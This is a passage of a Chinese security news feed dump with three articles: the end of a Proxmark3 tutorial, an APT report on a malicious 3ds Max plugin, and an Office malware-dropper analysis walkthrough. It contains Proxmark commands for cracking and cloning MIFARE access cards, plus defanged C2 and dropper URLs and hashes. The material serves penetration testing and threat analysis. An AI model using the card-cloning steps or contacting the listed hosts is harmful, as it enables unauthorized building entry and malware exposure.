class=\"brush:html;toolbar:false;\">&#160;http://www.nicolascourtois.com/papers/mifare_all.pdf</pre><p>如果两个密钥中的任何一个是已知的，则可以在嵌套攻击中使用它来访问密钥A和B可用的所有部分。如果感兴趣的话，其背后的数学方法很棘手，在资源部分中链接了paper。如果你不关心技术知识，只想克隆一些密钥，请查看以下命令：</p><p><strong style=\"white-space: normal;\">·&#160;</strong>使用默认键进行转储： hf mf dump</p><p><strong style=\"white-space: normal;\">·&#160;</strong>尝试使用默认密钥： hf mf chk *1 ? d</p><p><strong style=\"white-space: normal;\">·&#160;</strong>尝试嵌套攻击： hf mf nested 1 0</p><p><strong style=\"white-space: normal;\">·&#160;</strong>读取特定块： hf mf rdbl</p><p><strong style=\"white-space: normal;\">·&#160;</strong>阅读特定key： hf mf rdsc</p><p><strong style=\"white-space: normal;\">·&#160;</strong>写特定块： hf mf wrbl&#60;blockNum</p><p><strong style=\"white-space: normal;\">·&#160;</strong>嗅探卡通讯： hf mf sniff</p><p><strong style=\"white-space: normal;\">·&#160;</strong>克隆卡ID： hf mf restore (uses dumpdata.bin in current directory)</p><p>克隆Mifare经典卡通常是有效的攻击，但是最有趣的攻击来自修改卡上存储的数据。这通常涉及在已知状态下进行卡的转储，并将转储与最小更改后的另一个转储进行比较。逆向可以用来推断哪些值存储在卡上的什么位置。</p><p>请注意，卡上通常会存储某种校验和值，因此，如果校验和很复杂，使用先前捕获的转储进行重放攻击可能是最容易证明的威胁。</p><p><span style=\"font-size: 20px;\"><strong>MIFARE卡（C）：</strong></span></p><p>这些卡是高端市场，并为标准NDEF消息提供“高级” 3DES加密容器。3DES这是数据表，描述了auth协议和相关的锁定位：</p><p><strong>·&#160;</strong><a href=\"https://www.nxp.com/docs/en/data-sheet/MF0ICU2.pdf\">https://www.nxp.com/docs/zh-CN/data-sheet/MF0ICU2.pdf</a></p><p>重要的是要知道你可能应该将写操作放在7-39块之间。块40和更高的块控制着锁位，设置这些位可能最终导致永久（！）锁定其他块。</p><p>如果设置了用于敏感位授权的锁定位，则值得检查一下是否可以直接更改锁定位。有时他们设置了锁，但忘记了自己锁定锁位。</p><p><strong style=\"white-space: normal;\">·&#160;</strong>获取详细信息： hf mfu i</p><p><strong style=\"white-space: normal;\">·&#160;</strong>使用默认键进行转储： hf mfu dump</p><p><strong style=\"white-space: normal;\">·&#160;</strong>使用自定义键进行转储： hf mfu dump k</p><p><strong style=\"white-space: normal;\">·&#160;</strong>读取特定的块： hf mfu rdbl b</p><p><strong style=\"white-space: normal;\">·&#160;</strong>编写特定的块： hf mfu wrbl b</p><p><span style=\"font-size: 20px;\"><strong>高级功能</strong></span></p><p>有一个社区开发的存储库，具有持续的开发和高级功能。我没有尝试过刷新Proxmark上的固件，但是如果你需要使用强加密（DESFIRE等）来修改NFC卡，则可能需要此fork中的功能。我提供了一个参考链接，所有上述命令都适用于官方Proxmark存储库：</p><p><strong><strong style=\"white-space: normal;\">·</strong>&#160;</strong><a href=\"https://github.com/RfidResearchGroup/proxmark3\">https://github.com/RfidResearchGroup/proxmark3</a></p><p><span style=\"font-size: 20px;\"><strong>总结</strong></span></p><p>至此，你应该已经对Proxmark有了足够的熟悉。你可以破坏MiFare的加密，克隆HID卡，并证明攻击者可以进入他们喜欢的任何房间。充分利用这些知识，提高客户的安全性，并帮助引导他们转向使用诸如<a href=\"https://www.mifare.net/en/products/chip-card-ics/mifare-desfire/\">DESFIRE之</a>类的强加密功能的<a href=\"https://www.mifare.net/en/products/chip-card-ics/mifare-desfire/\">卡</a>。</p><p><strong>参考资源</strong></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/\">https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://hackerwarehouse.com/site-news/proxmark-first-use/\">https://hackerwarehouse.com/site-news/proxmark-first-use/</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux\">https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://www.nicolascourtois.com/papers/mifare_all.pdf\">http://www.nicolascourtois.com/papers/mifare_all.pdf</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://penturalabs.wordpress.com/2013/07/15/access-control-part-2-mifare-attacks/\">https://penturalabs.wordpress.com/2013/07/15/access-control-part-2-mifare-attacks/</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://esec-pentest.sogeti.com/posts/2011/11/28/playing-with-nfc-for-fun-and-coffee.html\">http://esec-pentest.sogeti.com/posts/2011/11/28/playing-with-nfc-for-fun-and-coffee.html</a></p><p><strong><strong style=\"white-space: normal;\">·</strong>&#160;</strong><a href=\"https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html\">https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html</a></p><p><strong><strong style=\"white-space: normal;\">·</strong>&#160;</strong><a href=\"https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/\">https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://www.proxmark.org/forum/index.php\">http://www.proxmark.org/forum/index.php</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://www.emsec.rub.de/media/crypto/veroeffentlichungen/2011/10/10/desfire_2011_extended_1.pdf\">http://www.emsec.rub.de/media/crypto/veroeffentlichungen/2011/10/10/desfire_2011_extended_1.pdf</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/\">https://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://www.openpcd.org/images/HID-iCLASS-security.pdf\">http://www.openpcd.org/images/HID-iCLASS-security.pdf</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://www.proxmark.org/forum/viewtopic.php?id=2443\">http://www.proxmark.org/forum/viewtopic.php?id=2443</a></p>","descriptionType":"text/html","publishedDate":"Sat, 05 Sep 2020 02:14:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200525/1590368411143749.jpg","linkMd5":"08fb58d49a8102ed244e7c3d2ac25e2d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn76@2020_1/2020/09/05/07-31-00-563_88f2917de2178d12.webp","destWidth":500,"destHeight":375,"sourceBytes":31911,"destBytes":31000,"author":"h1apwn","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200525/1590368411143749.jpg":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn76@2020_1/2020/09/05/07-31-00-563_88f2917de2178d12.webp"},"publishedOrCreatedDate":1599291056251},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"APT黑客组织使用Autodesk 3ds Max软件的恶意插件来入侵公司系统","link":"https://www.4hou.com/posts/Npoz","description":"<p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949779183647.png\" title=\"1598949779183647.png\" alt=\"3ds Max software.png\"/></p><p>近期，APT黑客组织利用传统3D计算机图形Autodesk软件中的一个漏洞，开始对国际建筑和视频创作公司的系统进行新的网络间谍攻击。</p><p>研究人员已经检测到了这个漏洞，并确认了是一个未知的黑客组织将恶意软件隐藏在3Ds Max插件中，攻击了来自世界各地的企业。</p><p>该组织通过使用一个用于Autodesk 3ds Max软件的恶意插件进行间谍活动。而且经确定，APT雇佣组织还向出价最高者提供帮助，扩大针对目标受害者的复杂攻击和网络间谍工具。&#160;</p><p><span style=\"font-size: 20px;\"><strong>目标</strong></span></p><p>根据该报告，威胁参与者始终以与房地产开发商合作的公司为目标，他们来自以下国家：</p><p><strong>· </strong>美国</p><p><strong style=\"white-space: normal;\">·&#160;</strong>英国</p><p><strong style=\"white-space: normal;\">·&#160;</strong>阿曼</p><p><strong style=\"white-space: normal;\">·&#160;</strong>南韩</p><p><strong style=\"white-space: normal;\">·&#160;</strong>日本&#160;</p><p><strong style=\"white-space: normal;\">·&#160;</strong>南非</p><p><span style=\"font-size: 20px;\"><strong>主要发现</strong></span></p><p>专家宣布了此漏洞中检测到的一些关键问题，下面将在此处进行提及：</p><p><strong style=\"white-space: normal;\">·&#160;</strong>潜在的APT雇佣组织可用于工业网络间谍活动</p><p><strong style=\"white-space: normal;\">·&#160;</strong>从事间谍活动的房地产企业</p><p><strong style=\"white-space: normal;\">·&#160;</strong>伪装成现代3D计算机图形软件的插件&#160;</p><p><strong style=\"white-space: normal;\">·&#160;</strong>针对公司的安全性进行测试的有效负载可避免在交付时泄露信息</p><p><strong style=\"white-space: normal;\">·&#160;</strong>总部位于韩国</p><p><span style=\"font-size: 20px;\"><strong>黑客将恶意插件隐藏在Autodesk 3ds Max软件中</strong></span></p><p style=\"text-align: center;\"><span style=\"font-size: 20px;\"><strong><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949796155471.png\" title=\"1598949796155471.png\" alt=\"JK 1.PNG\"/></strong></span></p><p>Autodesk通知用户有关“ PhysXPluginMfx” MAXScript漏洞的变体，该变体很容易损坏3ds Max的设置。因为它可以运行恶意代码，并在将受感染的文件放入软件后将其传送到Windows系统上的其他MAX文件。</p><p>但是，窃取者收集的数据因用户名、计算机名、网络适配器的IP地址、Windows产品名、.NET Framework的变体、处理器而不同。</p><p>3ds Max用户，请下载Autodesk 3ds Max 2021-2015SP1的最高级安全工具版本，以识别和消除PhysPluginMFX MAXScript恶意软件。</p><p>因此，专家们断言，对攻击的改进使APT组织的风格暴露出来，他们事先了解公司的安全系统，并使用软件应用程序（尤其是计划攻击的软件）攻击组织并过滤未检测到的数据。</p><p><strong>该恶意软件中使用的工具是：</strong></p><p>HdCrawler：此工具的主要作用是列出，撰写和维护特定文件的完整列表。</p><p>InfoStealer：此工具的主要作用或功能是收集信息，评分限制，捕获屏幕以及与计算机上的特定用户建立联系。</p><p><strong>使用扩展名</strong></p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .zip”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .rar”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .alz”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .7z”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .mp4”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .flv”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .webm”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .webp”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .jpg”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .jpeg”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .png”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .avi”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .mkv”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .mp3”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .mpeg”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .mpg”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .apk”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .obb”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .pur”</p><p><strong style=\"white-space: normal;\">·&#160;</strong>“ .uasset”</p><p>除此之外，攻击中应用了命令和控制（C＆C）基础，并且所有详细信息都已由网络安全公司分类。&#160;</p><p>但该公司还没有分享任何其他关于这一归属的信息，而这个漏洞却在默默地执行着它的操作。由于涵盖了恶意二进制文件，因此任务管理器或性能监视器在后台运行。</p><p><span style=\"font-size: 20px;\"><strong>妥协指标</strong></span></p><p><strong>文件哈希：</strong></p><p>•04715dd5b4e4e4e452d86f2c874ea9e6ad916f17838f116c8ab4ccfc7b9b6657&#160;</p><p>•1c2f754045bc442cf5147dadccd1ff3c8e58205362e1940c3f1f87ab303006a5&#160;</p><p>•A32f5e65051eb95d0ccdcc899d45f56369659a6edea068da5e59951f4c903f7b&#160;</p><p>•C75fcb34a5b35b6b73191de3f342806d3cce5a446c64f55fb3423f0cd5dbe248&#160;</p><p>•2d934a705638acd3fcb44f66a9a1633c27231550113f20df6061c10b1a6e9f6&#160;</p><p>•d6ad1e0b11a620ed4df39255ffff11a483687d7038d6c76b938d15add54345fa&#160;</p><p>2b394c330949c85097f13eded38f08b358d399b7615bbe3659dd9d82ec82675c&#160;</p><p>•A16b2c6a60975e4def1f799c69f7f38064653b5a99bc577fc008f0a808c7bc62&#160;</p><p>•E16a5847ac62bb4d5a661863fd5dba5201d27784e280aeee25a34702ed4c1528&#160;</p><p>•C2f51b2c116bcc9c95dbf567a90ec4fe0f5fbddb066a6d3cdf814295838e00f8</p><p>•D3a38047c207dee4b09d607a568390306f76025cd6986ec3e7c3fbd21a231d0e&#160;</p><p>•37ea55d1dceb467c595299f0f19a68d5530015b6d9c7ed5cc16324f52773e536&#160;</p><p>•711d45ff150aa734771fec1c08e394118a7bcd015dacac8889c965aeabfc7c9d&#160;</p><p>•07cebf1d377b9d28e53b7139a56e632e19c8f53e07546298f180322d462512e3&#160;</p><p>•536ef8065ded253465d6a5a967dafdcb2d158a7ea3157f0b265788745ed38409&#160;</p><p>•9e4ba32d42f26b7b3bb24ec786992ed017318a4074b2e141ad0f4a05435f4862&#160;</p><p><strong>文件名：</strong></p><p>•PhysXPluginStl.mse&#160;</p><p>•fixAll.mse&#160;</p><p>•default.mse&#160;</p><p>•％LOCALAPPDATA％\\微软\\的Internet Explorer \\ MSWINTAP.DAT&#160;</p><p>•％LOCALAPPDATA％\\微软\\的Internet Explorer \\ MSWINSIG.DAT&#160;</p><p>•％LOCALAPPDATA％\\ Microsoft \\ Internet Explorer \\ ie4uRidd.dat&#160;</p><p><strong>URL：</strong></p><p>•hxxp：//175.197.40 [。] 61：3445 / eYOMAHg</p><p>•hxxp：//175.197.40 [。] 61：3445 / YkSxBJVz&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 / n&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 / r&#160;</p><p>•hxxp ：//175.197.40 [。] 61：3445 / l&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 / b&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 / TYEHVSjn2Ny&#160;</p><p>•hxxp：/ /175.197.40[.]61:3445/grhL1wCYAhf•hxxp：//175.197.40&#160;</p><p>[。] 61：3445 / Public / Find_Alc&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 // Public / Find_Crp&#160;</p><p>• hxxp：//175.197.40 [。] 61：3445 / FRNuzqJIZyb&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 / Public / fixAll&#160;</p><p>•hxxp：//175.197.40 [。] 61：3445 / Public / NlWuLNUDzqM&#160;</p><p><strong>C＆C IP地址：</strong></p><p>•175 [。] 197 [。] 40 [。] 61</p>","descriptionType":"text/html","publishedDate":"Wed, 02 Sep 2020 02:45:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949779183647.png","linkMd5":"1b46b90ee5cb7d23c3202e2b104ab1b8","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn43@2020_2/2020/09/05/07-31-00-505_91ace699ff81f3ba.webp","destWidth":728,"destHeight":380,"sourceBytes":55594,"destBytes":29656,"author":"walker","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949779183647.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn43@2020_2/2020/09/05/07-31-00-505_91ace699ff81f3ba.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949796155471.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn36@2020_5/2020/09/05/07-31-25-393_08cfbc57f2fd4cb1.webp"},"publishedOrCreatedDate":1599291056256},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"MS Office恶意软件（Dropper）分析手记","link":"https://www.4hou.com/posts/ZpK6","description":"<p>根据Yoroi年度网络安全<a href=\"https://yoroi.company/downloads/\" target=\"_self\">报告</a>、网络威胁<a href=\"https://marcoramilli.com/cyber-threat-trends/\" target=\"_self\">趋势</a>以及其他资源来看，MS Office文件（Word文档和Excel电子表格）已经成为当前最常见的恶意软件加载器之一。通常情况下，攻击者会引诱受害者打开特制的Office文档，从而加载（有时甚至从外部资源中引入）恶意内容，并在登陆的主机上执行恶意代码。本文中，我们将为读者介绍如何利用各种逆向分析方法和恶意软件分析技术，来分析MS Office恶意软件（Dropper）。</p><p><span style=\"font-size: 20px;\"><strong>工具链</strong></span></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://github.com/DidierStevens/DidierStevensSuite/blob/master/rtfdump.py\" target=\"_self\">rtfdump.py</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://blog.didierstevens.com/programs/xorsearch/\" target=\"_self\">xorsearch</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://sandsprite.com/blogs/index.php?uid=7&pid=152\" target=\"_self\">scDBg</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"http://www.decalage.info/en/python/oleid\" target=\"_self\">oleid.py</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://www.decalage.info/python/oletools\" target=\"_self\">oletools</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://blog.didierstevens.com/2018/12/31/new-tool-msoffcrypto-crack-py/\" target=\"_self\">msoffcrypto-crack.py</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://www.aldeid.com/wiki/Python-oletools/olevba\" target=\"_self\">olevba</a></p><p><strong style=\"white-space: normal;\">·</strong>&#160;<a href=\"https://github.com/DissectMalware/XLMMacroDeobfuscator\" target=\"_self\">XLMDeobfuscator</a></p><p><span style=\"font-size: 20px;\"><strong>富文本格式（.RTF）</strong></span></p><p style=\"text-align: left;\">RTF格式是一种可以携带各种对象的文本格式。&#160;<span style=\"text-align: center;\">&#160;</span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994233494.png\" title=\"1599024731708779.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">RTF数据</p><p>实际上，Didier Stevens为我们提供了一款名为rtfdump.py的优秀工具，可以用来处理RTF文件。事实上，如果当我们利用这个工具处理RTF文件时，不仅看到文件的各个组成部分，同时，还能看到其运行后被包含和使用的各个对象，具体如下图所示。通常情况下，我会建议大家从“体型”较大的对象开始调查，换句话说，从字节数较多的对象开始入手。</p><p style=\"text-align:center\"><span style=\"font-size: 15px\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101994869773.png\" title=\"1599024765937556.png\" alt=\"1.png\"/></span></p><p style=\"text-align: center;\">考察RTF文件内容</p><p>实际上，rtfdump.py不仅提供了选择特定节的方法（-s），而且，您还可以决定是显示它，还是将其转储到一个文件中以进行其他分析。举例来说，如果您希望选择第2节并显示其内容，则可以使用如下所示的命令。</p><pre class=\"brush:html;toolbar:false\">python&#160;rtfdump.py&#160;-s&#160;2&#160;-H&#160;&#160;mal1.doc</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101995443982.png\" title=\"1599024794201080.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">EquationEditor (CVE-2017-11882) ?</p><p>根据个人经验，EquationEditor通常是一个危险的标志。因为攻击者经常利用CVE-2017-11882来运行特定的shellCode。如果你通过HexView检查第2节中的内容，你可能会发现某些编码模式，即反复出现的字符和符号。这通常是XOR/ROL/SHIFT加密函数的典型行为。为此，Didier Stevens提供了另一个有趣的工具，名为xorsearch。</p><p style=\"text-align: center;\"><span style=\"font-size:15px;color:black\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101995143789.png\" title=\"1599024847146790.png\" alt=\"1.png\"/></span></p><p style=\"text-align: center;\">转储二进制内容</p><p>在使用<a href=\"https://blog.didierstevens.com/programs/xorsearch/\" target=\"_self\">xorsearch</a>工具之前，我们需要将equationeditor所在节转储到一个外部文件中。完成这项任务后，请转到Windows系统（我们以后会需要它），并通过xorsearch.exe处理转储的二进制文件。</p><p>“[...]XORSearch是一个在XOR、ROL、ROT或SHIFT编码的二进制文件中搜索给定字符串的程序。对于使用XOR算法编码的二进制文件来说，通常会用一个常量值（密钥）对某些（或所有）字节执行XOR运算。对于使用ROL（或ROR）编码的文件来说，其字节被循环移位一定数量的位数（密钥）。而使用ROT编码的文件中的字母字符（A-Z和a-z），被循环移位了一定数量的步数。SHIFT编码文件的字节向左移动一定数量的位数（密钥）：第一个字节的所有位向左移动，第二个字节的MSB变成第一个字节的LSB，第二个字节的所有位向左移动，......XOR和ROL/OR编码经常被恶意代码开发者用来混淆像URL这样的字符串。[...]”（上述内容摘自Didier Stevens的博客)</p><p style=\"text-align: center;\"><span style=\"font-size:15px;color:black\">&#160; </span><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101996179265.png\" title=\"1599024874699235.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">利用XORSSearch处理经过编码的二进制文件</p><p>一旦运行，xorsearch就会提供许多偏移量，使我们有更大的机会发现控制权的变化情况。换句话说，如果我们从这些偏移量处运行shellcode的话，可以避免执行未对齐的指令。这时，您还可以借助于另一款号称ShellCode调试专家的软件：scDbg。运行该软件后(下图显示了其GUI)，你需要从xorsearch.exe给出的偏移量处运行模拟器，就本例来说，该偏移量为0x2c74c。在此，建议勾选“Unlimited steps”功能，这样的话，模拟器就能够在不停止shellcode的情况下进行跟踪；同时，我们还建议勾选“Reporting Mode”，这样你就可以在执行结束时看到一个摘要视图。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997496880.png\" title=\"1599024898717242.png\" alt=\"1.png\"/></p><p>在偏移量0x2c74c处运行scDbg。</p><p>运行结果如下所示：<span style=\"text-align: center;\">&#160;&#160;</span><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101997142388.png\" title=\"1599024922133683.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">执行Shellcode</p><p>有时候，攻击者会使用不同的系统调用：ExpandEnvironmentStringsW，它并非scDbg所hooked的函数。在这种情况下，您可能需要打开“刚刚转储的文件”，并通过将字符串ExpandEnvironmentStringsW替换为字符串ExpandEnvironmentStringsA来修补二进制文件。完成该操作后，将shellcode的修补版本重新加载到scDbg中并重新运行它，这样能获得更好的结果。</p><p><strong>IoC:</strong></p><p><strong style=\"white-space: normal;\">·&#160;</strong>b98b7be0d7a4004a7e3f22e4061b35a56f825fdc3cba29248cf0500beca2523d (<a href=\"https://yomi.yoroi.company/report/5efed7b02af7c988c96f32b6/5efed8d1b5b9ad1d886837b8/behavior\" target=\"_self\">mal1.doc</a>)</p><p><strong style=\"white-space: normal;\">·&#160;</strong>eac70cabccac5b0bd493111ec238f287e129923c27d68e5bb126d2442a4bf8da (转储的二进制文件)</p><p><strong style=\"white-space: normal;\">·&#160;</strong>//yatesassociates[.co[.za/documentato/MLY.exe (<a href=\"https://yomi.yoroi.company/report/5efed79e3cef2488de716269/5efedc40b5b9ad1d886837d6/overview\" target=\"_self\">下载地址</a>)</p><p><span style=\"font-size: 20px;\"><strong>Office文档中的加密内容</strong></span></p><p>有时候，你可能会遇到加密的Office文档。如果运行oleid，这时会看到“Encrypted”对应的值为“True”。对于这些使用VBA加密的OLE文件，我们是无法访问其原始内容的，从而难以逆向/研究/了解这些内容的作用。在这种情况下，你需要找出加密密钥，并对内容进行解密。</p><p style=\"text-align: center;\"><span style=\"font-size:15px;color:black\">&#160; </span><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998162329.png\" title=\"1599024953919632.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">OLEID表明内容已加密</p><p>幸运的是，MACRO代码进行了加密处理后，运行这些代码的客户端肯定知道如何解密，否则的话，它们也无法运行这些MACRO代码。</p><p>这种保护措施乍一看似乎比较可靠，但详细分析后发现，用于加密文档的密钥，并不是用户输入的密码（或其哈希值），而是存储在MS Excel程序代码中的一个固定密钥。这个密钥是由密码“VelvetSweatshop”生成的。这真是太搞笑了！大家可以尝试用该密码来保护一个MS Excel文档(或者用这个密码打开一个文档)。最令人惊讶的是，打开文档根本就不需要密码。</p><p>对于这个问题，我们可以借助于一个好帮手，即<a href=\"https://blog.didierstevens.com/2018/12/31/new-tool-msoffcrypto-crack-py/\" target=\"_self\">msoffcrypto-crack.py</a>。&#160;&#160;</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998462581.png\" title=\"1599025899208717.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">寻找“隐密”的微软加密密码</p><p>一旦找到了“加密密钥”，你可以直接解密文件内容了（使用同样的工具，即msoff-crypto-crack.py），以明文方式保存，然后，运行oledump.py处理该文件。这时，你应该可以看到正常的对象内容了。就本例来说，多用了一个Equation Editor。让我们转储它（oledump.py）。&#160;&#160;</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998107036.png\" title=\"1599025923849824.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">没有VBA宏的Equation Editor</p><pre class=\"brush:html;toolbar:false\">python3&#160;oledump.py&#160;-s&#160;B2&#160;-d&#160;cracked.xlsx&#160;&#62;&#160;out_b2.bin</pre><p>现在，让我们看看xorsearch.exe是否找到了常见的控制流模式！如果找到了的话，请使用scDBG.exe进一步分析。</p><p style=\"text-align: center;\"><span style=\"font-size:15px;color:black\">&#160; </span><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101999178992.png\" title=\"1599025950792722.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">使用XORSearch搜索二进制代码</p><p><strong>IoC:</strong></p><p><strong>·&#160;</strong>3f3c2a4cb476c76b8bf84d6d2b0ee1a0a589709ccc69e84ffe6b2afd2dadbb39 (<a href=\"https://yomi.yoroi.company/report/5efee7843cef2488de71626d/5efee836b5b9ad1d8868383e/overview\" target=\"_self\">XLS文件</a>)</p><p><strong style=\"white-space: normal;\">·&#160;</strong>03u.ru (D&#38;C2)</p><p><span style=\"font-size: 20px;\"><strong>带有VBA宏的Office文档</strong></span></p><p>分析恶意Office文档时，经常会文档中遇到VBA宏。这时，我们可以通过运行Oledump.py，检查各种VBA内容（宏所在的M标签），并将重点放在最“胖”的内容上。换句话说，强烈建议从内容较多的地方开始着手（因此，就下图来说，我们可以从A11处着手调查，因为它的字节数最多），因为这些地方最有可能找到我们感兴趣的IoC。</p><p style=\"text-align: center;\"><span style=\"font-size:15px;color:black\">&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101999346752.png\" title=\"1599025976116941.png\" alt=\"1.png\"/></span></p><p style=\"text-align: center;\">oledump显示的VB宏</p><p>在这种情况下，olevba能够给我们带来很大的帮助。该工具可以模拟VBA引擎，从而运行宏脚本，执行的结果如下图所示。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102000389091.png\" title=\"1599026000388734.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">VBA仿真程序</p><p>这个仿真引擎会一直运行，直到一个已知函数到达终点为止。例如</p><p><strong>IoC:</strong></p><p><strong style=\"white-space: normal;\">·&#160;</strong>84a07333851ed300b34b34a026a58636844861e2d5265f2faabddddf05815f21 (direct.07.20.doc)</p><p><strong style=\"white-space: normal;\">·&#160;</strong>detayworx[.com/_vsnpNgyXp84Os8Xh.php (Dropper)</p><p><span style=\"font-size: 20px;\"><strong>Office Excel Macro 4.0</strong></span></p><p>有时你会打开一个恶意的MS Excel电子表格，但是里面并没有包含MACRO代码。这种技术为攻击者提供了一种简单可靠的方法，使他们能够在目标网络上站稳脚跟，因为它只是滥用了Excel的合法功能，并不依赖于任何漏洞或exploit。它只是一个“古董级”的功能特性（几乎有30年历史），只是近几年才开始被攻击者所利用。关于这种类型的攻击的缓解措施，可以访问这篇<a target=\"_self\">文档</a>。&#160;&#160;</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102000648897.png\" title=\"1599026029579910.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">没有MACRO代码的Excel文档！</p><p>通过运行OLEVBA，你就可以检查它是否发现了我们感兴趣的东西。就上图来说，它指出该文档应用了XLM Excel 4。当然，用于去混淆并进行分析的工具有许多，有的功能很简单，有的则非常复杂。根据我的经验，<a href=\"https://github.com/DissectMalware/XLMMacroDeobfuscator\" target=\"_self\">XLMDeobfuscator</a>用起来非常顺手，所以，下文中我们将以它为例进行介绍。</p><p>为了对XLM中的宏代码进行去混淆，可使用下列技术：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102001106861.png\" title=\"1599026056638538.png\" alt=\"1.png\"/></p><p style=\"text-align: center;\">&#160;OLEVBA.py发现MACRO 4.0</p><p>在未启用宏的情况下打开恶意文件，打开宏编辑器，复制以下脚本并保存，然后，在启用宏的情况下重新打开该文件。</p><pre 